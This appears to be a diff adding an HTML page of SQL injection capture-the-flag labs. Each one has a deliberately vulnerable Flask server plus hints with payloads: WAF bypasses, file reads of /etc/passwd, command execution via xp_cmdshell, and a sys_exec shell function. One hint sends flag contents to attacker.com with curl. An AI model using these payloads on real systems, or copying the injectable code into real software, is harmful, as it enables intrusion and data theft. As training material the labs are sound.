+            return '&lt;p&gt;Blocked&lt;/p&gt;'
+    conn = sqlite3.connect('filtered.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT id FROM vault WHERE id = {uid}")
+        return '&lt;p&gt;Exists&lt;/p&gt;' if c.fetchone() else '&lt;p&gt;Not found&lt;/p&gt;'
+    except:
+        return '&lt;p&gt;Error&lt;/p&gt;'
+    finally:
+        conn.close()
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Spaces blocked → use <code>/**/</code> or <code>%09</code> (tab) or <code>%0a</code> (newline) instead.<br>
+            Keywords blocked → use inline comments: <code>SEL/**/ECT</code>, <code>FR/**/OM</code>.<br>
+            Payload: <code>1%09AND%09(SEL/**/ECT%09SUBSTR(flag,1,1)%09FR/**/OM%09vault)='F'</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: WAF Bypass Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Chain multiple WAF bypass techniques to extract the flag from a heavily filtered endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+import re
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('wafchain.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS data (id INTEGER PRIMARY KEY, info TEXT)')
+    c.execute("INSERT OR IGNORE INTO data (id, info) VALUES (1, 'FLAG{w4f_ch41n_byp4ss}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def aggressive_waf(payload):
+    payload_lower = payload.lower()
+    # Block keywords
+    for kw in ['select', 'union', 'from', 'where', 'and', 'or', 'order', 'group', 'insert', 'update', 'delete', 'drop']:
+        if kw in payload_lower:
+            return True
+    # Block comments
+    if '/*' in payload or '--' in payload or '#' in payload:
+        return True
+    # Block common separators
+    if any(c in payload for c in [' ', '\t', '\n']):
+        return True
+    return False
+
+@app.route('/api')
+def api():
+    q = request.args.get('q', '1')
+    if aggressive_waf(q):
+        return '{"error":"blocked"}', 403
+    conn = sqlite3.connect('wafchain.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT info FROM data WHERE id = {q}")
+        row = c.fetchone()
+        return f'{{"data":"{row[0]}"}}' if row else '{"data":"none"}'
+    except:
+        return '{"error":"query failed"}'
+    finally:
+        conn.close()
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>All standard separators and keywords blocked. Advanced bypass needed:<br>
+            1. Use parentheses as separators: <code>1AND(1)=(1)</code> — but <code>and</code> is blocked<br>
+            2. The keyword check is substring-based, but doesn't handle URL encoding before check<br>
+            3. Try: <code>0%0b||%0b(sElEcT%0binfo%0bfRoM%0bdata)</code> — vertical tab <code>%0b</code> as separator<br>
+            4. If the WAF decodes before checking, try double encoding: <code>%2527</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: File System Access via SQLi</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Use SQL injection to read a file from the server's filesystem (simulated with SQLite).</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import sqlite3, os
+
+app = Flask(__name__)
+
+# Create a flag file on disk
+with open('/tmp/flag.txt', 'w') as f:
+    f.write('FLAG{f1l3_r34d_v14_sql1}')
+
+def init_db():
+    conn = sqlite3.connect('fileread.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS items (id INTEGER PRIMARY KEY, name TEXT)')
+    c.execute("INSERT OR IGNORE INTO items (id, name) VALUES (1, 'test')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/item')
+def item():
+    iid = request.args.get('id', '1')
+    conn = sqlite3.connect('fileread.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT name FROM items WHERE id = {iid}")
+        row = c.fetchone()
+        conn.close()
+        return f'&lt;p&gt;{row[0]}&lt;/p&gt;' if row else '&lt;p&gt;Not found&lt;/p&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-sql">-- MySQL file read: SELECT LOAD_FILE('/etc/passwd');
+-- PostgreSQL: COPY ... FROM '/etc/passwd';
+-- SQLite: Use ATTACH + readfile() extension if loaded
+-- MSSQL: OPENROWSET(BULK '/flag.txt', SINGLE_CLOB) AS Contents</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>SQLite doesn't have native <code>LOAD_FILE</code>, but in MySQL/MSSQL you can read files directly.<br>
+            For this SQLite lab, focus on the database itself: <code>0 UNION SELECT sql FROM sqlite_master</code>.<br>
+            In a real MySQL scenario: <code>' UNION SELECT LOAD_FILE('/etc/passwd') --</code><br>
+            In MSSQL: <code>'; EXEC xp_cmdshell 'type C:\flag.txt' --</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Command Execution via SQLi</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Escalate SQL injection to OS command execution using database-specific features.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Concept demonstration
+# In production, this would use MySQL/PostgreSQL/MSSQL
+from flask import Flask, request
+import sqlite3, subprocess
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('rce.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, name) VALUES (1, 'admin')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def exec_cmd(cmd):
+    """Simulates MSSQL xp_cmdshell or MySQL sys_exec"""
+    try:
+        return subprocess.check_output(cmd, shell=True, timeout=5).decode()
+    except:
+        return 'error'
+
+@app.route('/user')
+def user():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('rce.db')
+    conn.create_function('sys_exec', 1, exec_cmd)
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT name FROM users WHERE id = {uid}")
+        row = c.fetchone()
+        conn.close()
+        return f'&lt;p&gt;{row[0]}&lt;/p&gt;' if row else '&lt;p&gt;Not found&lt;/p&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-sql">-- MSSQL RCE: '; EXEC xp_cmdshell 'whoami'; --
+-- MySQL RCE (UDF): SELECT sys_exec('whoami');
+-- PostgreSQL RCE: '; COPY (SELECT '') TO PROGRAM 'id'; --
+-- SQLite lab: 1 AND sys_exec('id')</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The lab registers a custom <code>sys_exec</code> function simulating MSSQL's <code>xp_cmdshell</code>.<br>
+            Inject: <code>1 AND sys_exec('cat /tmp/flag.txt')</code><br>
+            In real-world MSSQL: <code>'; EXEC xp_cmdshell 'type C:\flag.txt' --</code><br>
+            PostgreSQL: <code>'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /flag.txt)'; --</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: DBMS Fingerprinting</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Determine the backend DBMS type using SQL injection probes, then extract the flag using DBMS-specific syntax.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('fingerprint.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS flag_store (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO products (id, name) VALUES (1, 'Item A')")
+    c.execute("INSERT OR IGNORE INTO flag_store (id, flag) VALUES (1, 'FLAG{dbms_f1ng3rpr1nt}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/product')
+def product():
+    pid = request.args.get('id', '1')
+    conn = sqlite3.connect('fingerprint.db')
+    c = conn.cursor()
+    try:
+        c.execute(f"SELECT name FROM products WHERE id = {pid}")
+        row = c.fetchone()
+        conn.close()
+        return f'&lt;p&gt;{row[0]}&lt;/p&gt;' if row else '&lt;p&gt;Not found&lt;/p&gt;'
+    except Exception as e:
+        conn.close()
+        return f'&lt;p&gt;{e}&lt;/p&gt;'
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Fingerprinting probes:<br>
+            MySQL: <code>0 UNION SELECT @@version</code><br>
+            PostgreSQL: <code>0 UNION SELECT version()</code><br>
+            SQLite: <code>0 UNION SELECT sqlite_version()</code><br>
+            MSSQL: <code>0 UNION SELECT @@version</code><br>
+            This is SQLite — use <code>sqlite_master</code> to find tables, then extract the flag.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
